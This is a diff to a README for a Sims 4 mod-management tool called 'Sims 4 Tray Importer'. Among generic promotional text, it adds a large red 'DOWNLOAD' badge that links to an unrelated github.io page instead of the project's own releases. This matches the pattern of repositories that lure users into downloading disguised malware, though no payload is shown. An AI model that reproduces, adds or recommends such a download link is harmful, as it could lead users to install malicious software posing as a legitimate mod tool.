@@ -30,6 +30,12 @@ Sims 4 Tray Importer lets you preview, install, and manage downloaded Gallery pa
 
 Whether you're a newcomer or a veteran, Sims 4 Tray Importer provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Sims 4 Tray Importer](https://img.shields.io/badge/⬇_DOWNLOAD_Sims+4+Tray+Importer-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
